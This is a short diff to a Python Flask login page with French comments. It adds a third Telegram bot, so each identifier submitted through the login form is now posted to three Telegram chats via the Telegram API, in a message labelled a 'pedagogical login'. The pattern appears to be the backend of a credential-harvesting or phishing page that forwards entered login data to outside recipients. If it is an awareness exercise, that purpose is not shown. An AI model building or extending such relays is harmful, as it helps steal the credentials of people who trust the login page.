@@ -16,8 +16,11 @@ CHAT_ID_1 = os.getenv("CHAT_ID_1")
 BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2")
 CHAT_ID_2 = os.getenv("CHAT_ID_2")
 
-# Vérification
-if not BOT_TOKEN_1 or not CHAT_ID_1 or not BOT_TOKEN_2 or not CHAT_ID_2:
+BOT_TOKEN_3 = os.getenv("BOT_TOKEN_3")
+CHAT_ID_3 = os.getenv("CHAT_ID_3")
+
+# Vérification des variables d'environnement
+if not all([BOT_TOKEN_1, CHAT_ID_1, BOT_TOKEN_2, CHAT_ID_2, BOT_TOKEN_3, CHAT_ID_3]):
     raise ValueError("Une ou plusieurs variables d'environnement sont manquantes.")
 
 @app.route('/', methods=['GET', 'POST'])
@@ -30,8 +33,14 @@ def login():
 
         message = f"🟢 Connexion pédagogique :\n\n🧑 Identifiant : {identifiant}"
 
-        # Envoi aux deux bots
-        for token, chat in [(BOT_TOKEN_1, CHAT_ID_1), (BOT_TOKEN_2, CHAT_ID_2)]:
+        # Envoi aux trois bots
+        bots = [
+            (BOT_TOKEN_1, CHAT_ID_1),
+            (BOT_TOKEN_2, CHAT_ID_2),
+            (BOT_TOKEN_3, CHAT_ID_3)
+        ]
+
+        for token, chat in bots:
             url = f"https://api.telegram.org/bot{token}/sendMessage"
             payload = {'chat_id': chat, 'text': message}
             response = requests.post(url, data=payload)
